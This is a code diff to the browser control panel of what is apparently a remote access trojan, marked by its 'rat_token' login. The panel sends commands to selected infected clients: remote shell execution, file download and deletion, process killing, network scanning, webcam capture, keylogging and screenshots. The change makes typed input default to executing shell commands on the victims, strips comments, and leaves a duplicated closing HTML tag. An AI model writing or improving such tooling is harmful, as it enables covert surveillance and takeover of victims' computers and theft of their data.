@@ -459,7 +459,6 @@
         logEntry.className = `mt-2 p-2 rounded ${colors[type]}`;
         logEntry.innerHTML = `<span class="text-gray-500 text-xs mr-2">[${timestamp}]</span> ${message}`;
         
-        // Remove placeholder if it exists
         const placeholder = DOM.outputArea.querySelector('.text-center');
         if (placeholder) placeholder.remove();
         
@@ -518,7 +517,7 @@
         
         ws.onclose = (event) => {
             updateConnectionStatus('disconnected');
-            if (event.code === 4401) { // Custom code for unauthorized
+            if (event.code === 4401) {
                 localStorage.removeItem('rat_token');
                 window.location.href = `/login?error=${encodeURIComponent('Session expired or invalid. Please log in again.')}`;
             } else if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
@@ -649,18 +648,25 @@
             return;
         }
         
-        const [action, ...args] = command.substring(1).split(' ');
+        const [actionWithSlash, ...args] = command.split(' ');
+        const action = actionWithSlash.startsWith('/') ? actionWithSlash.substring(1) : 'exec';
+        
         const payload = { action, target_ids: Array.from(selectedClients) };
 
-        // This is a simplified parser. A more robust one would be needed for complex args.
-        if (['exec', 'download', 'cd', 'rm', 'mkdir', 'kill', 'msgbox', 'network_scan', 'webcam_start', 'keylogger'].includes(action)) {
-            if (action === 'exec') payload.command = args.join(' ');
-            else if (action === 'msgbox') payload.text = args.join(' ');
-            else if (action === 'kill') payload.pid = args[0];
-            else if (action === 'network_scan') payload.range = args[0];
-            else if (action === 'webcam_start') payload.index = args[0];
-            else if (action === 'keylogger') payload.count = args[0];
-            else payload.path = args[0];
+        if (action === 'exec') {
+            payload.command = command;
+        } else if (['download', 'cd', 'rm', 'mkdir'].includes(action)) {
+            payload.path = args[0];
+        } else if (action === 'kill') {
+            payload.pid = args[0];
+        } else if (action === 'msgbox') {
+            payload.text = args.join(' ');
+        } else if (action === 'network_scan') {
+            payload.range = args[0];
+        } else if (action === 'webcam_start') {
+            payload.index = args[0];
+        } else if (action === 'keylogger') {
+            payload.count = args[0];
         }
         
         if (ws && ws.readyState === WebSocket.OPEN) {
@@ -764,7 +770,7 @@
 
     function displayServerStats(stats) {
         const content = DOM.serverStatsContent;
-        content.innerHTML = ''; // Clear previous stats
+        content.innerHTML = '';
         const statItems = {
             'Uptime': stats.uptime,
             'Total Clients': stats.total_clients,
@@ -789,7 +795,6 @@
 
     // --- EVENT LISTENERS ---
     function setupEventListeners() {
-        // Command sending
         $('#send-command').addEventListener('click', sendCommandToClients);
         DOM.commandInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter' && !e.shiftKey) {
@@ -802,7 +807,6 @@
             if (!DOM.commandInput.contains(e.target)) hideCommandSuggestions();
         });
 
-        // Quick actions
         $('.quick-action').forEach(btn => {
             btn.addEventListener('click', () => {
                 DOM.commandInput.value = btn.dataset.command + ' ';
@@ -811,7 +815,6 @@
             });
         });
 
-        // Client management
         $('#refresh-clients').addEventListener('click', requestClientList);
         $('#select-all-clients').addEventListener('click', () => {
             const allClientIds = Array.from($('.client-card')).map(card => card.dataset.clientId);
@@ -822,7 +825,6 @@
             updateClientVisuals();
         });
 
-        // Output management
         $('#clear-output').addEventListener('click', () => {
             DOM.outputArea.innerHTML = `<div class="text-gray-400 text-center py-5"><i class="fas fa-terminal text-3xl mb-3"></i><p>Output cleared.</p></div>`;
         });
@@ -841,7 +843,6 @@
             URL.revokeObjectURL(url);
         });
 
-        // File upload
         $('#upload-btn').addEventListener('click', () => DOM.fileUpload.click());
         DOM.fileUpload.addEventListener('change', (e) => {
             if (e.target.files.length > 0) {
@@ -849,7 +850,6 @@
             }
         });
 
-        // Media controls
         $('#download-screenshot').addEventListener('click', () => {
             const a = document.createElement('a');
             a.href = DOM.screenshotImg.src;
@@ -869,7 +869,6 @@
             DOM.mediaPlaceholder.classList.remove('hidden');
         });
 
-        // Server stats modal
         $('#server-stats-btn').addEventListener('click', loadServerStats);
         $('#close-stats-modal').addEventListener('click', () => DOM.serverStatsModal.classList.add('hidden'));
         $('#refresh-stats').addEventListener('click', loadServerStats);
@@ -888,5 +887,7 @@
 
     document.addEventListener('DOMContentLoaded', init);
   </script>
+</body>
+</html>
 </body>
 </html>
